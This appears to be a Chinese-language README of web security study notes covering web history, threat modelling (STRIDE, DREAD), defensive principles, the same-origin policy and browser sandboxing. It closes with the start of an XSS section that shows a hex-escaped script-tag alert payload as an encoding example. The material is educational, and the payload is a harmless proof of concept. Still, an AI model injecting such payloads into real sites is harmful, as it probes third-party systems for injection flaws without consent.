Attention: 
> 1. 由于中国的中考，我将停止一段时间来编辑这个文件。当我再次有空时，我将继续把各文件夹中的文章编进readme.md中，毕竟各文件夹内的文档可视性并不高(I will be taking a break from working on this document for a while due to the senior high school entrance exams in China. When I am free again, I will continue to compile the articles in the various folders into a readme.md. After all, there is not much visibility of the documents in each folder.)
> 2. 在阅读各内容之前，建议先阅读rules.md文件(It is recommended to read the rules.md file before reading the individual contents.)
> 3. 我的英语水平非常差，所以本文中的英文可能会出现一些差错，如果发现比较奇怪的英语语法或内容时，建议使用翻译器翻译上方的中文，请谅解(My English is very poor, so there may be some errors in the English in this article. If you find strange English grammar or content, please understand that you are advised to use a translator to translate the Chinese above.)
> 4. 本文章内的所有内容均以中文呈现。本作者现在正在学习英语，现只到达托福60分的水准，等到以后我的英语学习之路基本完成，我会继续编写英文版内容，请谅解(All content in this article is presented in Chinese. The author is currently studying English and has only reached a TOEFL score of 60. Please understand that I will continue to write English content when my English learning journey is basically complete.)
> 5. 文段中存在重复的问题的地方，会只在一处地方讲解(Where there are repetitive questions in the passage, they will be explained in one place only.)
> 6. 一些重要内容会用红色标注，标题会用黄色标注，但颜色不会在github界面显示，如果可以，请调至code模式观看，如果将文档下载至本地，则建议使用深色界面观看(Some important content will be marked in red, title will be marked in yellow, but the colour will not be displayed in the github interface, if possible, please turn to code mode to watch, if you are downloading a document locally, it is recommended that you use the dark interface to view it)
> 7. 如果现在有需要阅读英文版的文章，请使用翻译器辅助阅读(推荐使用chatGPT进行翻译，因为翻译器不能完整且准确地表达出本文中的专业性知识，若使用chatGPT，建议给一个前情提要)(If you now have to read the English version of the article, please use a translator to assist you in reading it. (It is recommended to use chatGPT for translation, as the translator does not give a complete and accurate representation of the expertise in this article, if you use chatGPT, it is recommended to give a foreword.))
> 8. 如果我的文章中存在任何问题，欢迎大家指出(If there are any problems in my article, please feel free to point them out.)
> 9. 以下内容和各文件夹(文件夹不包括reprint、thematic topic and analysis、tools)中的内容一致，仅为更可观的版本存在于此(The following content corresponds to the content in each folder (folders excluding reprint, thematic topic and analysis, tools), only the more substantial version exists here.)

csdn address:[hackjacking.blog.csdn.net](https://hackjacking.blog.csdn.net/)

# Web

参考资料来源于
> - CSDN
> - GitHub
> - Google
> - 维基百科
> - YouTube
> - MDN Web Docs
> - 其他小型网站与书籍

## <font color="yellow">0x00世界观安全</font>

### <font color="yellow">01 Web发展史</font>

#### <font color="yellow">001 静态网页的诞生</font>

> 1989年，在欧洲粒子物理实验室(粒子物理研究通常与来自世界各地的研究所进行合作)的IT部门工作的Tim Berners-Lee向其领导提出了一项名为Information Management: A Proposal的提议：使来自世界各地的远程站点的研究人员能够组织和汇集信息，在个人计算机上访问大量的科研文献，并建议在文档中链接其他文档，这就是Web的原型
>
> 1990年，Tim以超文本语言HTML为基础在NeXT电脑上发明了最原始的Web浏览器
>
> 1991年，Tim作为布道者在Internet上广泛推广Web的理念，与此同时，美国国家超算应用中心(National Center for Supercomputer Applications)对此表现出了浓厚的兴趣，并开发了名为Mosaic的浏览器，于1993年4月进行了发布
>
> 1994年5月，第一届万维网大会在日内瓦召开
>
> 1994年7月，HTML2规范发布
>
> 1994年9月，因特网工程任务组(Internet Engineering Task Force)设立了HTML工作组
>
> 1994年11月，Mosaic浏览器的开发人员创建了网景公司(Netscape Communications Corp.)，并发布了Mosaic Netscape 1.0 beta浏览器，后改名为Navigator

#### <font color="yellow">002 万维网(W3C)诞生</font>

> 1994年底，由Tim牵头的万维网联盟(World Wide Web Consortium)成立，这标志着万维网的正式诞生
>
> 此时的网页以HTML为主，是纯静态的网页，网页是“只读”的，信息流只能通过服务器到客户端单向流通，由此世界进入了Web 1.0时代
>
> W3C在1994年被创建的目的是，为了完成麻省理工学院(MIT)与欧洲粒子物理研究所(CERN)之间的协同工作，并得到了美国国防部高级研究计划局(DARPA)和欧洲委员会(European Commission)的支持
>
> W3C最重要的工作是发展Web规范(称为推荐，Recommendations)，这些规范描述了Web的通信协议(比如HTML和XHTML)和其他的构建模块

#### <font color="yellow">003 JavaScript的诞生</font>

> 1995年，网景工程师Brendan Eich花了10天时间设计了JavaScript语言。起初这种脚本语言叫做Mocha，后改名LiveScript，后来为了借助Java语言创造良好的营销效果最终改名为JavaScript。网景公司把这种脚本语言嵌入到了Navigator 2.0之中，使其能在浏览器中运行
>
> 与此相对的是，1996年，微软发布了VBScript和JScript。JScript是对JavaScript进行逆向工程的实现，并内置于Internet Explorer 3中。但是JavaScript与JScript两种语言的实现存在差别，这导致了程序员开发的网页不能同时兼容Navigator和Internet Explorer浏览器。Internet Explorer开始抢夺Netscape的市场份额，这导致了第一次浏览器战争

#### <font color="yellow">004 第一次浏览器战争</font>

> Netscape的市场份额逐年萎缩
>
> 1996年11月，为了确保JavaScript的市场领导地位，网景将JavaScript提交到欧洲计算机制造商协会（European Computer Manufacturers Association）以便将其进行国际标准化
> 
> 1997年6月，ECMA以JavaScript语言为基础制定了ECMAScript标准规范ECMA-262。JavaScript是ECMAScript规范最著名的实现之一，除此之外，ActionScript和JScript也都是ECMAScript规范的实现语言。自此，浏览器厂商都开始逐步实现ECMAScript规范
> 
> 1998年6月，ECMAScript2规范发布，并通过ISO生成了正式的国际标准ISO/IEC 16262
> 
> 1999年12月，ECMAScript3规范发布，在此后的十年间，ECMAScript规范基本没有发生变动。ECMAScript3成为当今主流浏览器最广泛使用和实现的语言规范基础
> 
> 第一次浏览器战争以IE浏览器完胜Netscape而结束，IE开始统领浏览器市场，份额的最高峰达到2002年的96%。随着第一轮大战的结束，浏览器的创新也随之减少

#### <font color="yellow">005 动态页面的崛起</font>

> JavaScript诞生之后，可以用来更改前端DOM的样式，实现一些类似于时钟之类的小功能。那时候的JavaScript仅限于此，大部分的前端界面还很简单，显示的都是纯静态的文本和图片。这种静态页面不能读取后台数据库中的数据，为了使得Web更加充满活力，以PHP、JSP、ASP.NET为代表的动态页面技术相继诞生
>
> PHP（PHP：Hypertext Preprocessor）最初是由Rasmus Lerdorf在1995年开始开发的，现在PHP的标准由PHP Group维护。PHP是一种开源的通用计算机脚本语言，尤其适用于网络开发并可嵌入HTML中使用。PHP的语法借鉴吸收C语言、Java和Perl等流行计算机语言的特点，易于一般程序员学习。PHP的主要目标是允许网络开发人员快速编写动态页面
>
> JSP（JavaServer Pages）是由Sun公司倡导和许多公司参与共同创建的一种使软件开发者可以响应客户端请求，从而动态生成HTML、XML或其他格式文档的Web网页的技术标准。JSP技术是以Java语言为基础的。1999年，JSP1.2规范随着J2EE1.2发布
>
> ASP（Active Server Pages）1.0 在1996年随着IIS 3.0而发布。2002年，ASP.NET发布，用于替代ASP
> 
> 随着这些动态服务器页面技术的出现，页面不再是静止的，页面可以获取服务器数据信息并不断更新。以Google为代表的搜索引擎以及各种论坛相继出现，使得Web充满了活力
> 
> 随着动态页面技术的不断发展，后台代码变得庞大臃肿，后端逻辑也越来越复杂，逐渐难以维护。此时，后端的各种MVC框架逐渐发展起来，以JSP为例，Struct、Spring等框架层出不穷
> 
> 从Web诞生至2005年，一直处于后端重、前端轻的状态

#### <font color="yellow">006 XHTML</font>

> 1999年，W3C发布HTML 4.01标准，同年微软推出用于异步数据传输的ActiveX，随即各大浏览器厂商模仿实现了XMLHttpRequest（AJAX雏形）
>
> 2000年，W3C采用了一个大胆的计划，把XML引入HTML，XHTML 1.0作为W3C推荐标准发布
>
> 2001年5月，W3C推出了CSS 3.0规范草案
>
> 2002年到2006年，XHTML 2.0最终放弃
>
> 2009年，W3C宣布XHTML 2.0不再继续，宣告死亡

#### <font color="yellow">007 AJAX的流行</font>

> 在Web最初发展的阶段，前端页面要想获取后台信息需要刷新整个页面，这是很糟糕的用户体验
>
> Google分别在2004年和2005年先后发布了两款重量级的Web产品：Gmail和Google Map。这两款Web产品都大量使用了AJAX技术，不需要刷新页面就可以使得前端与服务器进行网络通信，这虽然在当今看来是理所应当的，但是在十几年前AJAX却是一项革命性的技术，颠覆了用户体验
>
> 随着AJAX的流行，越来越多的网站使用AJAX动态获取数据，这使得动态网页内容变成可能，像Facebook这样的社交网络开始变得繁荣起来，前端一时间呈现出了欣欣向荣的局面
>
> AJAX使得浏览器客户端可以更方便地向服务器发送数据信息，这促进了Web 2.0的发展
>
> Google Trend: AJAX从2005年开始得到开发人员的广泛关注

#### <font color="yellow">008 第二次浏览器大战</font>

> 前端兼容性框架的出现
>
> IE在第一次浏览器大战中击败Netscape赢得胜利，垄断了浏览器市场。作为独裁者，IE并不遵循W3C的标准，IE成了事实标准
>
> Netscape于1998年被AOL收购前创建了Mozilla社区，Firefox于2004年11月首次发布，并且9个月内下载量超过6000万，获取了巨大的成功，IE的主导地位首次受到了挑战，Firefox被认为是Netscape的精神续作
>
> 之后Firefox浏览器一路奋起直追，逐渐蚕食IE市场份额，这引发了第二次浏览器战争。在2008年底时，Firefox的市场份额达到了25%以上，IE则跌至65%以下
>
> 第二次浏览器战争中，随着以Firefox和Opera为首的W3C阵营与IE对抗程度的加剧，浏览器碎片化问题越来越严重，不同的浏览器执行不同的标准，对于开发人员来说这是一个恶梦
>
> 为了解决浏览器兼容性问题，Dojo、jQuery、YUI、ExtJS、MooTools等前端Framework相继诞生。前端开发人员用这些Framework频繁发送AJAX请求到后台，在得到数据后，再用这些Framework更新DOM树
>
> 其中，jQuery独领风骚，几乎成了所有网站的标配。Dojo、YUI、ExtJS等提供了很多组件，这使得开发复杂的企业级Web应用成为可能
>
> Google Trend: 蓝色jQuery，红色Dojo，绿色YUI，紫色ExtJS，黄色MooTools

#### <font color="yellow">009 HTML5</font>

> 1999年，W3C发布了HTML 4.0.1版本，在之后的几年，没有再发布更新的Web标准。随着Web的迅猛发展，旧的Web标准已不能满足Web应用的快速增长
>
> 2004年6月，Mozilla基金会和Opera软件公司在万维网联盟（W3C）所主办的研讨会上提出了一份联合建议书，其中包括Web Forms 2.0的初步规范草案。建议举行一次投票，以表决W3C是否应该扩展HTML和DOM，从而满足Web应用中的新需求。研讨会最后以8票赞成，14票反对否决此建议，这引起一些人的不满，不久后，部分浏览器厂商宣布成立网页超文本技术工作小组（WHATWG），以继续推动该规范的开发工作，该组织再度提出Web Applications 1.0规范草案，后来这两种规范合并形成HTML5。2007年，获得W3C接纳，并成立了新的HTML工作团队。2008年1月22日，第一份正式草案发布
>
> HTML5草案发布不久，Google在2008年12月发布了Chrome浏览器，加入了第二次浏览器大战当中。Chrome使用了Safari开源的WebKit作为布局引擎，并且研发了高效的JavaScript引擎V8
>
> 尽管HTML5在网络开发人员中非常出名了，但是它成为主流媒体的一个话题是在2010年的4月，当时苹果公司的CEO乔布斯发表一篇题为“对Flash的思考”的文章，指出随着HTML5的发展，观看视频或其它内容时，Adobe Flash将不再是必须的。这引发了开发人员间的争论，包括HTML5虽然提供了加强的功能，但开发人员必须考虑到不同浏览器对标准不同部分的支持程度的不同，以及HTML5和Flash间的功能差异
>
> 在第二次浏览器大战中，各个浏览器厂商都以提升JavaScript运行效率和支持HTML5各种新特性为主要目标，促进了浏览器的良性竞争。在这一场战争中，Chrome攻城略地，抢夺IE市场份额。2013年，Chrome超过IE，成为市场份额最高的浏览器。2016年，Chrome占据了浏览器市场的半壁江山
>
> 全球浏览器市场份额（2009-2017）
>
> 自2008年以来，浏览器中不断支持的HTML5新特性让开发者激动不已：WebWorker可以让JavaScript运行在多线程中，WebSocket可以实现前端与后台的双工通信，WebGL可以创建Web3D网页游戏......
>
> 桌面浏览器对HTML5支持程度（2009-2017）
>
> 2014年10月28日，W3C正式发布HTML 5.0推荐标准

#### <font color="yellow">010 Node.js的爆发</font>

> 早在1994年，Netspace就公布了其Netspace Enterprise Server中的一种服务器脚本实现，叫做LiveWire，是最早的服务器端JavaScript，甚至早于浏览器中的JavaScript。对于这门图灵完备的语言，Netspace很早就开始尝试将它用在后端
>
> 微软在1996年发布的IE 3.0中内嵌了自己的JScript语言，其兼容JavaScript语法。1997年年初，微软在它的服务器IIS 3.0中也包含了JScript，这就是我们在ASP中能使用的脚本语言
>
> 1997年，Netspace为了用Java实现JavaScript而创建了Rhino项目，最终Rhino演变成一个基于Java实现的JavaScript引擎，由Mozilla维护并开源。Rhino可以为Java应用程序提供脚本能力。2006年12月，J2SE 6将Rhino作为Java默认的脚本引擎
>
> SpiderMonkey是Mozilla用C/C++语言实现的一个JavaScript引擎，从Firefox 3.5开始作为JavaScript编译引擎，并被CouchDB等项目作为服务端脚本语言使用
>
> 可以看到，JavaScript最开始就能同时运行在前后端，但时在前后端的待遇却不尽相同。随着Java、PHP、.Net等服务器端技术的风靡，与前端浏览器中的JavaScript越来越流行相比，服务端JavaScript逐渐式微
>
> 2008年Chrome发布，其JavaScript引擎V8的高效执行引起了Ryan Dahl的注意。2009年，Ryan利用Chrome的V8引擎打造了基于事件循环的异步I/O框架——Node.js诞生
>
> Node.js具有以下特点
>
> - 基于事件循环的异步I/O框架，能够提高I/O吞吐量
> - 单线程运行，能够避免了多线程变量同步的问题
> - 使得JavaScript可以编写后台代码，前后端编程语言统一
>
> Node.js的出现吸引了很多前端开发人员开始用JavaScript开发服务器代码，其异步编程风格也深受开发人员的喜爱。Node.js的伟大不仅在于拓展了JavaScript在服务器端的无限可能，更重要的是它构建了一个庞大的生态系统
>
> 2010年1月，NPM作为Node.js的包管理系统首次发布。开发人员可以按照CommonJS的规范编写Node.js模块，然后将其发布到NPM上面供其他开发人员使用。目前NPM具有40万左右的模块，是世界上最大的包模块管理系统
>
> 2016年常见包管理系统模块数量，NPM高居榜首
>
> Node.js也催生了node-webkit等项目，用JavaScript开发跨平台的桌面软件也成为可能。Node.js给开发人员带来了无穷的想象，JavaScript大有一统天下的趋势

#### <font color="yellow">011 前端MV*架构</font>

> 随着HTML5的流行，前端不再是人们眼中的小玩意，以前在C/S中实现的桌面软件的功能逐步迁移到了前端，前端的代码逻辑逐渐变得复杂起
>
> 以前只用于后台的`MV*`等架构在前端逐渐使用起来，以下列举了部分常用的`MV*`框架来
>
> 随着这些MV*框架的出现，网页逐渐由Web Site演变成了Web App，最终导致了复杂的单页应用（ Single Page Application）的出现
>
> 移动Web和Hybrid App
>
> 随着iOS和Android等智能手机的广泛使用，移动浏览器也逐步加强了对HTML5特性的支持力度
>
> 移动浏览器对HTML5支持程度（2009-2017）
>
> 移动浏览器的发展，导致了流量入口逐渐从PC分流到移动平台，这是Web发展的新机遇。移动Web面临着更大的碎片化和兼容性问题，jQuery Mobile、Sencha Touch、Framework7、Ionic等移动Web框架也随之出现
>
> 相比于Native App，移动Web开发成本低、跨平台、发布周期短的优势愈发明显，但是Native App的性能和UI体验要远胜于移动Web。移动Web与Native App孰优孰劣的争论愈演愈烈，在无数开发者的实践中，人们发现两者不是替代关系，而是应该将两者结合起来，取长补短，Hybrid技术逐渐得到认同
>
> Hybrid技术指的是利用Web开发技术，调用Native相关API，实现移动与Web二者的有机结合，既能体现Web开发周期短的优势，又能为用户提供Native体验
>
> 根据实现原理，Hybrid技术可以分为两大类
> 
> - 将HTML5的代码放到Native App的WebView控件中运行，WebView为Web提供宿主环境，JavaScript代码通过WebView调用Native API。典型代表有PhoneGap(Cordova)以及国内的AppCan等
> - 将HTML5代码针对不同平台编译成不同的原生应用，实现了Web开发，Native部署。这一类的典型代表有Titanium和NativeScript
>
> Hybrid一系列技术中很难找出一种方案适应所有应用场景，我们需要根据自身需求对不同技术进行筛选与整合

#### <font color="yellow">012 ECMAScript6</font>

> JavaScript语言是ECMAScript标准的一种实现，截止2017年2月，ECMAScript一共发布了7个版本
>
> 1997年6月， ECMAScript 1.0标准发布
>
> 1998年6月，ECMAScript 2.0发布
>
> 1999年12月，ECMAScript 3.0发布
>
> 2007年10月，Mozilla主张的ECMAScript 4.0版草案发布，对3.0版做了大幅升级，该草案遭到了以Yahoo、Microsoft、Google为首的大公司的强烈反对，JavaScript语言的创造者Brendan Eich和IE架构师Chris Wilson甚至在博客上就ES4向后兼容性问题打起了口水仗，最后由于各方分歧太大，ECMA开会决定废弃中止ECMAScript 4.0草案。经各方妥协，在保证向下兼容的情况下，将部分增强的功能放到ECMAScript 3.1标准中，将原有ECMAScript 4.0草案中激进的功能放到以后的标准中。不久，ECMAScript 3.1就改名为ECMAScript 5
>
> 2009年12月，本着'Don’t break the web'原则，ECMAScript 5发布。新增了strict模式、属性getter和setter等
>
> 2011年6月，ECMAScript 5.1发布
>
> 2015年6月，ECMAScript 6.0发布。该版本增加了许多新的语法，包括支持let、const、Arrow function、Class、Module、Promise、Iterator、Generator、Set、Map、async、Symbol、Proxy、Reflect、Decorator等。TC39委员会计划以后每年都发布一个新版本的ECMAScript，所以ECMAScript 6.0改名为ECMAScript 2015
>
> 2016年6月，在ECMAScript 2015的基础上进行了部分增强，发布了ECMAScript 2016
>
> 在ECMAScript的各个版本中，ECMAScript 6.0无疑最受人瞩目的，它增加了许多新特性，极大拓展了JavaScript语法和能力，以至于许多浏览器都只能支持部分ES6中的新特性。随之，Babel和TypeScript逐渐流行起来，编写ES6代码，然后用Babel或TypeScript将其编译为ES5等浏览器支持的JavaScript
>
> ECMAScript以后每年将会发布一个新版本，这无疑将持续促使浏览器厂商不断为JavaScript注入新的功能与特性，JavaScript走上了快速发展的正轨

### <font color="yellow">02 安全世界观</font>

#### <font color="yellow">001 简介</font>

用户的最高权限叫做root(administrator) ，黑客最渴望的就是获得root

黑客使用的漏洞利用代码叫做exploit

黑客中的种类

- 一、精通计算机技术，能自己挖漏洞，并编写exploit，`多为白帽`
- 二、只对攻击本身感兴趣，对技术方面各项的了解比较浅，自己没有动手能力，只能看懂别人的代码，这类黑客被称为Script kids，`这是大多数黑客的类型`，`虽然黑客本身是具有破坏性的，但是第一种黑客是鳳毛麟角`


现实中，真正能够造成大规模破坏的往往不是挖掘并研究漏洞的黑客，而是这些Script Kids

SQL注入、XSS攻击的出现是Web安全史上的一个里程碑

伴随着Web 2.0 的兴起，XSS、CSRF等攻击已经变得更强大了

#### <font color="yellow">002 黑帽子、白帽子</font>

黑帽子：利用黑客技术造成破坏
1. 工作心态方面：
   - 工作心态：找到系统的一个漏洞，达到入侵的目的
   - 工作环境：一个人或小团队(黑客有关)
   - 工作目的：入侵系统，找到对自己价值的数据，以点突破，找到对自己最有作用的点以此渗透
   - 工作观察方面：思考问题的出发点必然是选择性的、微观性的
2. 对待问题方式：
   - 对待问题：为了完成一次入侵，需要利用各种不同漏洞的组合来达到目的

白帽子：精通安全技术，但工作在反黑客领域的网络安全专家
1. 工作心态方面：
    - 工作心态：找到系统的所有漏洞，不有遗漏项，保证系统不再出问题，`不可能做到100%无漏洞，只是让黑客无从下手`
    - 工作环境：为企业或安全公司工作
    - 工作目的：出发点在于解决一切安全问题
    - 工作观察方面：所看所想要全面和宏观
2. 对待问题方式：
    - 对待问题：在设计方案时，如果只看到各种问题组合后产生的效果，就会把事情变得更复杂，难以细致入微地解决根本问题，所以白帽子必然是在不断地分解问题，在对分解后的问题逐个给予解决
    - 选用的方法：客服某种攻击方式，而并非抵御单次攻击

#### <font color="yellow">003 安全的本质</font>

通过安全检测的过程，可与梳理未知的人或物，使其变得可信任，被划分出来的具有不同信任级别的区域，被称为信任域，划分两个信任域的分界线，被称为信任边界

安全问题的考虑选择：选择内容为发生概率高的安全问题，不太会考虑不可能发生的事件

一旦我们做出决策的依据、条件被打破、被绕过，那么就会导致安全假设的前提条件不再可靠，变成一个伪命题

把握住信任条件的度，使其恰到好处，正是设计安全方案的难点所在，也正是安全这门学问的魅力所在

安全是一个持续学习的内容

#### <font color="yellow">004 安全三要素</font>

简称CIA

- 机密性(Confidentiality)：要求保护数据内容不能泄露，加密是实现机密性要求的常见手段
- 完整性(Integrity)：要求保护数据内容是完整、没有更改的，常见的保证一致性的技术手段是数字签名
- 可用性(Availability)：要求保护资源是随需而得的

随着时代的进步，后人又增加了可设计性、不可抵赖性等，但最核心的还是以上三要素在设计安全方案时也要以这三要素为思考的出发点，更全面地思考问题

> 不可抵赖性，又称不可否认性，英文为Non-repudiation，电子商务交易各方在交易完成时要保证的不可抵赖性，指在传输数据时必须携带含有自身特质、别人无法复制的信息，防止交易发生后对行为的否认，通常可通过对发送的消息进行数字签名来实现信息的不可抵赖性

#### <font color="yellow">005 如何实施安全评估</font>

安全评估的过程
1. 资产等级划分

有时候资源的可用性可以理解为数据的可用性，互联网安全的核心问题是数据安全的问题

2. 威胁分析

`威胁：只可能导致对系统或组织危害的事故潜在的起因`，可能造成危害的来源叫做危害；可能出现的损失叫做分险

威胁建模方法 —— STRIDE
- Spoofing(伪装)
	- 定义：冒充他人身份
	- 对应的安全属性：认证
- Tampering(更改)
	- 定义：修改数据或代码
	- 对应的安全属性：完整性
- Repudiation(抵赖)
	- 定义：否认做过的事情
	- 对应的安全属性：不可抵赖性
- InformationDisclosure(信息泄露)
	- 定义：机密信息泄露
	- 对应的安全属性：机密性
- Denial of Service(拒绝服务)
	- 定义：拒绝服务
	- 对应的安全属性：可用性
- Elevation of Privilege(提升权限)
	- 定义：未经授权获得许可
	- 对应的安全属性：授权

在进行威胁分析时，要尽可能地不遗漏威胁，头脑风暴的过程可以确定攻击面(Attack Surface)

漏洞的定义：系统中可能被威胁利用以造成危害的地方

3. 风险分析

`风险：指某种特定的危险事件(事故或意外事件)发生的可能性与其产生的后果的组合`

影响风险高低的因素
  1. 造成损失的大小
  2. 发生的概率

风险程度模型 —— DREAD
- Damage Potential
	- 高：获取完整的验证权限；执行管理员操作；非法上传文件
	- 中：泄露敏感信息
	- 低：泄露其他信息
- Reproducibility
	- 高：攻击者可以重复攻击
	- 中：攻击者可以重复攻击，但有时间限制
	- 低：攻击者很难重复攻击
- Exploitability
	- 高：初学者在短期内能掌握攻击方法
	- 中：熟练的攻击者才能完成这次攻击
	- 低：漏洞利用条件非常苛刻
- Affected Users
	- 高：所有用户，默认设置，关键用户
	- 中：部分用户，非默认配置
	- 低：极少数用户，匿名用户
- Discoverability
	- 高：漏洞很显眼，攻击条件很容易获得
	- 中：在私有区域，部分人能看到，需要深入挖掘漏洞
	- 低：发现该漏洞极为困难

风险高低的定义(高(3)中(2)低(1))
  - Risk = D(a)+R(b)+E(c)+A(d)+D(e) = a+b+c+d+e
		- 高危：Risk = 12～15
		- 中危：Risk = 8～11
		- 低危：Risk = 0～7

<font color="red">模型只是工具，起决定性作用的是人</font>

4. 确认解决方案
解决方案一定要有针对性，针对前三点做出安全方案

安全评估的产出物就是安全解决方案

一个好的安全解决方案须具备以下几点：
  - 能够有效解决问题
  - 用户体验好
  - 高性能
  - 低耦合`耦合度：是对模块间关联程度的度量，耦合的强弱取决于模块间接口的复杂性，调用模块的方式以及通过界面传送数据的多少`

`优势：易于扩展与升级，如果是由专职的安全团队长期维护的系统，有些阶段可以只是实施一次`

#### <font color="yellow">006 白帽子兵法</font>

1. Secure By Default 原则

`最基本也是最重要的原则`

a. 黑白名单

`SSH段口有很多功能可以替代Telent，又可以为FTP、POP、PPP提供一个安全的通道`

`SSH是目前比较可靠的专为远程登录会话和其他网络服务提供安全性的协议`

- 黑名单：不安全程序
- 白名单：较安全程序

如果允许工程师在服务器上随意安装软件的话，则可能会因为安全部门不知道、不熟悉的软件，导致一些漏洞出现，从而增大攻击面

`在电脑系统里，有很多软件都应用到了黑白名单规则，操作系统、防火墙、杀毒软件、邮件系统、应用软件等，凡是涉及到控制方面几乎都应用了黑白名单规则`

b. 最小权限原则

`最小权限是指每个程序和系统用户都应该具有完成任务所必需的最小权限集合，因此，对于系统管理员而言，一个用户应该只能访问履行他的相关职责所需访问的数据和硬件`

最小权限原则要求系统只授予主体必要的权限，而不要过度授权，这样能有效的减少系统、网络、应用、数据库出错的机会

`sudo：linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令`

2. 纵深防御原理

Defense in Depth

- 要在各个不同层面、不同方面实施安全方案，避免出现疏漏，不同安全方案之间需要相互配合，构成一个整体
- 要在正确的地方做正确的事，在解决根本问题的地方实施针对行的安全方案
	
他要求我们深入理解威胁的本质，从而做出正确的应对措施，更全面、正确地看待问题

UTM(Unified Threat Management)统一威胁管理

`纵深防御：通过设置多层重叠的安全防护系统而构成多道防线，使得即使某一防线失效也能被其他防线弥补或纠正，即通过增加系统的防御屏障或将各层之间的漏洞错开的方式防范差错发生的`

3. 数据与代码分离原理
	
这一原则广泛适用于各种由于注入(e.g.：SQL Injection;XSS;CRLF Injection;X-Path Injection)而引发的安全问题场景

缓冲区溢出也可以认为是程序违背了这一原则的后果

`缓冲区是一块连续的计算机内存区域,可保存相同数据类型的多个实例`

`缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容(通常是超过缓冲区能保存的最大数据量的数据)，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权`

从漏洞成因上看待问题

4. 不可预测性原则

克服攻击方法的角度看问题

Unpredictable

能够有效地对抗基于篡改、伪造的攻击

当token足够复杂时，不能被攻击者在测到

我们无法要求运行的程序没有漏洞，所以要使漏洞的攻击方法失败

需要用到加密算法、随机数算法、哈希算法

#### <font color="yellow">007 总结</font>

安全是一门朴素的学问，也是一种平衡的艺术

## <font color="yellow">0x01 客户端脚本安全</font>

### <font color="yellow">01 浏览器安全</font>

#### <font color="yellow">001 同源策略(Same Origin Policy)</font>

是一种约定，它是浏览器最核心、最基本的安全功能，如果缺少了同源策略，浏览器的正常功能可能都会受到影响

可以说，Web是建立在同源策略之上的

浏览器的同源策略限制了来自不同源的document或脚本，对当前document读取或设置某些属性

对于JavaScript来说，不同的URL会被分为同源与不同源`影响原因：host(域名/IP地址)、子域名、端口、协议`

XMLHttpRequest可以访问同源对象的内容，但同样收到同源的约束，使其不能跨越访问资源，在AJAX应用的开发中尤其注意这一点

除了DOM、Cookie、XMLHttpRequest会受到同源策略的限制，浏览器加载的一些第三方插件也有各自的同源策略`最常见的是Flash、Java Applet、Silverlight、Google Gears都有自己的控制策略`

浏览器的同源策略是浏览器安全的基础，许多客户端脚本攻击，都需要遵守这一原则，因此理解同源策略对于客户端脚本攻击有着重要意义，同源策略一旦被出现的漏洞绕过，也将带来非常严重的后果，很多基于同源策略制定的安全方案将失去效果
`同源是指域名、协议、端口相同`

`同源策略，它是由Netscape提出的一个著名的安全策略`

`同源策略是浏览器的行为，是为了保护本地数据不被JavaScript代码获取回来的数据污染，因此拦截的是客户端发出的请求回来的数据接收，即请求发送了，服务器响应了，但是无法被浏览器接收`

#### <font color="yellow">002 浏览器沙箱</font>

在网页中插入一段恶意代码，利用浏览器漏洞执行任意代码的攻击方式，在黑客圈子里被形象地称为挂马

防挂马操作：浏览器密切结合DEP、ASLR、SafeSEH等保护系统
> Google Chrome流程
>   浏览器进程
>   渲染进程`由Sandbox即沙箱隔离`
>   插件进程`e.g.：将Flash、Java、Pdf进行隔离，因此不会相互影响`
>   扩展进程

现在的Sandbox已经成为泛指资源隔离类模块的代名词

Sandbox的设计目的一般是为了让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源

现在了浏览器的内部结构文件已经受到Sandbox的保护，但第三方应用却不受Sandbox的管辖，所以被攻克的浏览器往往是第三方应用的安全漏洞

```text
Sandbox是指一种技术，在这种技术中，软件运行在操作系统受限制的环境中
由于该软件在受限制的环境中运行，即使一个闯入该软件的入侵者也不能无限制访问操作系统提供设施
获得该软件控制权的黑客造成的损失也是有限的
如果攻击者要获得对操作系统的完全控制，他们就不得不攻克沙箱限制，Sandbox也提供深度防御
许多PaaS系统都提供了一个实时运行环境，它的核心就是一个沙箱应用程序
如Azu re和Google App Engime
```

#### <font color="yellow">003 恶意网址拦截</font>

工作原理：一般都是浏览器周期性地从服务器获取一份最新的恶意网址黑名单，如果用户上网时访问的网址在黑名单中，浏览器将弹出警告

常见的恶意网址分类
1. 挂马的网站，这些网站通常包含有恶意的脚本，如JavaScript或Flash，通过利用浏览器的漏洞执行shellcode，在用户电脑中植入木马
2. 钓鱼网站，通过模仿知名网站的相似页面来欺骗用户

除了恶意网址黑名单拦截功能外，主流浏览器都开始支持EV SSL(Extended Validation SSL Certificate)证书，以增强对安全网址的识别，`EV SSL证书是全球数字证书颁发机构与浏览器厂商一起打造的增强型证书`，其主要特色是浏览器会给予EV SSL证书特殊的待遇

EV SSL证书也遵循X509标准，并向前兼容普通证书，如果浏览器不支持EV模式，则会把该证书当作普通证书，如果浏览器支持EV模式，则会在地址栏中特别标注，因此在网站使用了EV SSL证书后，可以教育用户识别真实网站在浏览器地址栏中的绿色表现，以对抗钓鱼网站

#### <font color="yellow">004 高速发展的浏览器安全</font>

现在的浏览器还在不断地更新，不断地推出新的安全功能

CSP(Content Security Policy)这一策略是由安全专家Robert Hanson最早提出的

- 做法：由一个服务器返回一个HTTP头，并在其中描述页面应该遵守的安全策略

浏览器加载的插件也是浏览器安全需要考虑的一个问题：扩展与插件的权限到高于页面JavaScript的权限

#### <font color="yellow">005 总结</font>

浏览器是互联网安全的重要接口，在安全攻防中，浏览器的作用也越来越被人们重视

在以往研究攻防时，大家更重视服务器端漏洞，现在，安全研究的范围已经涵盖了所有用户使用互联网的方式，浏览器正是其中最重要的一个部分

加深理解同源策略，才能把握浏览器安全的本质

随着信息技术的发展，恶意网址检测、插件安全等问题都会显得越来越重要

### <font color="yellow">02 跨站脚本攻击(XSS)</font>

#### <font color="yellow">001 转义字符</font>

首先要认识一下`\`，`\`在JavaScript有着特殊的用途，它是转义的符号

e.g.：`\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x70\x6F\x72\x75\x69\x6E\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E`

这些就是经过编码后的字符，因为前面的`\`缘故，所以后面的这些字符在JavaScript中都会被还原

